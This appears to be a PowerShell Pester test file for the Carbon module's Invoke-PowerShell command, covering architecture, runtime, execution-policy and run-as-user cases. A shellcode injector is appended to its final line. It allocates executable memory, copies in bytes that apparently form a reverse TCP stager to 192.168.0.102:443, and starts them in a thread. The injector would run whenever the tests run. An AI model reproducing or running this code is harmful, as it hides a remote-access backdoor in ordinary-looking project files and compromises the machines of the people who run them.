











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$ps3Installed = $false
$PSVersion,$CLRVersion = powershell -NoProfile -NonInteractive -Command { $PSVersionTable.PSVersion ; $PSVersionTable.CLRVersion }
$getPsVersionTablePath = Join-Path -Path $PSScriptRoot -ChildPath 'PowerShell\Get-PSVersionTable.ps1' -Resolve


$setExecPolicyScriptBlock = { Set-ExecutionPolicy -ExecutionPolicy RemoteSigned }
Invoke-CPowerShell -ScriptBlock $setExecPolicyScriptBlock
Invoke-CPowerShell -ScriptBlock $setExecPolicyScriptBlock -x86

function Assert-EnvVarCleanedUp
{
    It 'should clean up environment' {
        ([Environment]::GetEnvironmentVariable('COMPLUS_ApplicationMigrationRuntimeActivationConfigPath')) | Should BeNullOrEmpty
    }
}

Describe 'Invoke-PowerShell.when running a ScriptBlock' {
    $command = {
        param(
            $Argument
        )
            
        $Argument
    }
        
    $result = Invoke-PowerShell -ScriptBlock $command -Args 'Hello World!'
    It 'should execute the scriptblock' {
        $result | Should Be 'Hello world!'
    }
}
    
Describe 'Invoke-PowerShell.when running a 32-bit PowerShell' {
    $command = {
        $env:PROCESSOR_ARCHITECTURE
    }
        
    $result = Invoke-PowerShell -ScriptBlock $command -x86
    It 'should run under x86' {
        $result | Should Be 'x86'
    }
}
    
if( Test-Path -Path HKLM:\SOFTWARE\Microsoft\PowerShell\3 )
{
    if( $Host.Name -eq 'Windows PowerShell ISE Host' )
    {
        Describe 'Invoke-PowerShell.when in the ISE host and running a scripb block under PowerShell 2' {
            $command = {
                $PSVersionTable.CLRVersion
            }
        
            $error.Clear()
            $result = Invoke-PowerShell -ScriptBlock $command -Runtime v2.0 -ErrorAction SilentlyContinue
            It 'should write an error' {
                $error.Count | Should Be 1
            }

            It 'should not execute the script block' {
                $result | Should BeNullOrEmpty
            }

            Assert-EnvVarCleanedUp
        }
    }
    else
    {
        Describe 'Invoke-PowerShell.when in the console host and running a script blcok under PowerShell 2' {
            if( (Test-Path -Path 'env:APPVEYOR') )
            {
                return
            }

            It '(the test) should make sure .NET 2 is installed' {
                (Test-DotNet -V2) | Should Be $true
            }
            $command = {
                $PSVersionTable.CLRVersion
            }
        
            $error.Clear()
            $result = Invoke-PowerShell -ScriptBlock $command -Runtime v2.0 
            It 'should not write an error' {
                $error.Count | Should Be 0
            }

            It 'should execute the script block' {
                $result | Should Not BeNullOrEmpty
                $result.Major | Should Be 2
            }

            Assert-EnvVarCleanedUp
        }
    }
}
    
Describe 'Invoke-PowerShell.when running a command under PowerShell 4' {
    $command = {
        $PSVersionTable.CLRVersion
    }
        
    $result = Invoke-PowerShell -Command $command -Runtime v4.0
    It 'should run the command' {
        $result.Major | Should Be 4
    }

    Assert-EnvVarCleanedUp
}
    
if( (Test-OSIs64Bit) )
{
    Describe 'Invoke-PowerShell.when running x86 PowerShell' {
        $error.Clear()
        if( (Test-PowerShellIs32Bit) )
        {
            $result = Invoke-PowerShell -ScriptBlock { $env:PROCESSOR_ARCHITECTURE }
        }
        else
        {
            $command = @"
& "$(Join-Path -Path $PSScriptRoot -ChildPath '..\Carbon\Import-Carbon.ps1' -Resolve)"

if( -not (Test-PowerShellIs32Bit) )
{
    throw 'Not in 32-bit PowerShell!'
}
Invoke-PowerShell -ScriptBlock { `$env:PROCESSOR_ARCHITECTURE }
"@
            $result = Invoke-PowerShell -Command $command -Encode -x86
        }

        It 'should not write an error' {
            $error.Count | Should Be 0
        }

        It 'should execute the scriptblock' {
            $result | Should Be 'AMD64'
        }
    }
}
       
Describe 'Invoke-PowerShell.when running 32-bit script block from 32-bit PowerShell' {
    $error.Clear()
    if( (Test-PowerShellIs32Bit) )
    {
        $result = Invoke-PowerShell -ScriptBlock { $env:ProgramFiles } -x86
    }
    else
    {
        $command = @"
& "$(Join-Path -Path $PSScriptRoot -ChildPath '..\Carbon\Import-Carbon.ps1' -Resolve)"

if( -not (Test-PowerShellIs32Bit) )
{
    throw 'Not in 32-bit PowerShell!'
}
Invoke-PowerShell -ScriptBlock { `$env:ProgramFiles } -x86
"@
        $result = Invoke-PowerShell -Command $command -Encode -x86
    }

    It 'should not write an error' {
        $error.Count | Should Be 0
    }

    It 'should run command under 32-bit PowerShell' {
        ($result -like '*Program Files (x86)*') | Should Be $true
    }
}
    
Describe 'Invoke-PowerShell.when running a script' {
    $result = Invoke-PowerShell -FilePath $getPsVersionTablePath `
                                -OutputFormat XML `
                                -ExecutionPolicy RemoteSigned 
    It 'should run the script' {
        $result.Length | Should Be 3
        $result[0] | Should Be ''
        $result[1] | Should Not BeNullOrEmpty
        $result[1].PSVersion | Should Be $PSVersion
        $result[1].CLRVersion | Should Be $CLRVersion
        $result[2] | Should Not BeNullOrEmpty
        $architecture = 'AMD64'
        if( Test-OSIs32Bit )
        {
            $architecture = 'x86'
        }
        $result[2] | Should Be $architecture
    }
}
    
Describe 'Invoke-PowerShell.when running a script with arguments' {
    $result = Invoke-PowerShell -FilePath $getPsVersionTablePath `
                                -OutputFormat XML `
                                -ArgumentList '-Message',"'Hello World'" `
                                -ExecutionPolicy RemoteSigned
    It 'should pass arguments to the script' {
        $result.Length | Should Be 3
        $result[0] | Should Be "'Hello World'"
        $result[1] | Should Not BeNullOrEmpty
        $result[1].PSVersion | Should Be $PSVersion
        $result[1].CLRVersion | Should Be $CLRVersion
    }
}
    
Describe 'Invoke-PowerShell.when running script with -x86 switch' {
    $result = Invoke-PowerShell -FilePath $getPsVersionTablePath `
                                -OutputFormat XML `
                                -x86 `
                                -ExecutionPolicy RemoteSigned 
    It 'should run under 32-bit PowerShell' {
        $result[2] | Should Be 'x86'
    }
}
    
Describe 'Invoke-PowerShell.when running script with v4.0 runtime' {
    $result = Invoke-PowerShell -FilePath $getPsVersionTablePath `
                                -OutputFormat XML `
                                -Runtime 'v4.0' `
                                -ExecutionPolicy RemoteSigned 

    It 'should run under 4.0 CLR' {
        ($result[1].CLRVersion -like '4.0.*') | Should Be $true
    }
}
    
Describe 'Invoke-PowerShell.when running script under v2.0 runtime' {
    It '[the test] should make sure .NET 2 is installed' {
        (Test-DotNet -V2) | Should Be $true
    }

    $result = Invoke-PowerShell -FilePath $getPsVersionTablePath `
                                -OutputFormat XML `
                                -Runtime 'v2.0' `
                                -ExecutionPolicy RemoteSigned 
    
    $result | Write-Debug
    It 'should run under .NET 2.0 CLR' {
        ,$result | Should Not BeNullOrEmpty
        ($result[1].CLRVersion -like '2.0.*') | Should Be $true
    }
}
    
Describe 'Invoke-PowerShell.when setting execution policy when running a script' {
    $Global:Error.Clear()
    $result = Invoke-PowerShell -FilePath $getPsVersionTablePath `
                                -ExecutionPolicy Restricted `
                                -ErrorAction SilentlyContinue 2>$null
    
    It 'should set the execution policy' {
       $result | Should BeNullOrEmpty
        ($Global:Error -join [Environment]::NewLine) |  Should Match 'disabled'
    }
}

$getUsernamePath = Join-Path -Path $PSScriptRoot -ChildPath 'PowerShell\Get-Username.ps1' -Resolve

Describe 'Invoke-PowerShell.when running a script as another user' {
    $Global:Error.Clear()
    $return = 'fubar'
    $result = Invoke-PowerShell -FilePath $getUsernamePath `
                                -ArgumentList '-InputObject',$return `
                                -Credential $CarbonTestUser
    It 'should run the script' {
        $result.Count | Should Be 2
        $result[0] | Should Be $return
        $result[1] | Should Be $CarbonTestUser.UserName
    }

    $result = Invoke-PowerShell -FilePath $getUsernamePath `
                                -ArgumentList '-InputObject',$return `
                                -ExecutionPolicy Restricted `
                                -Credential $CarbonTestUser `
                                -ErrorAction SilentlyContinue
    It 'should use PowerShell parameters' {
        $result | Should BeNullOrEmpty
        ($Global:Error -join [Environment]::NewLine) |  Should Match 'disabled'
    }
}

Describe 'Invoke-PowerShell.when running a command as another user' {
    $Global:Error.Clear()
    $result = Invoke-PowerShell -Command '$env:Username' -Credential $CarbonTestUser
    It 'should run the command as the user' {
        $result | Should Be $CarbonTestUser.UserName
    }

    $result = Invoke-PowerShell -Command $getUsernamePath -ExecutionPolicy Restricted -Credential $CarbonTestUser -ErrorAction SilentlyContinue
    It 'should set powershell.exe parameters' {
        $result | Should BeNullOrEmpty
        ($Global:Error -join [Environment]::NewLine) |  Should Match 'disabled'
    }
}

Describe 'Invoke-PowerShell.when running a script block as another user' {
    $Global:Error.Clear()
    $result = Invoke-PowerShell -Command { 'fubar' } -Credential $CarbonTestUser -ErrorAction SilentlyContinue
    It 'should write an error' {
        $Global:Error | Should Match 'script block as another user'
    }
    It 'should not write anything' {
        $result | Should BeNullOrEmpty
    }
}

Describe 'Invoke-PowerShell.when running a command with an argument list' {
    $Global:Error.Clear()
    $result = Invoke-PowerShell -Command 'write-host fubar' -ArgumentList 'snafu' -ErrorAction SilentlyContinue
    It 'should write an error' {
        $Global:Error | Should Match 'doesn''t support'
    }

    It 'should not run the command' {
        $result | Should BeNullOrEmpty
    }
}

Describe 'Invoke-PowerShell.when running non-interactively' {
    $Global:Error.Clear()
    $result = Invoke-PowerShell -Command 'Read-Host ''prompt''' -NonInteractive -ErrorAction SilentlyContinue
    It 'should write an error' {
        Invoke-Command -ScriptBlock {
                                        
                                        $result 
                                        ($Global:Error -join [Environment]::NewLine) 
                                    } |
            Where-Object { $_ -match 'is in NonInteractive mode' } |
            Should Not BeNullOrEmpty
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x66,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

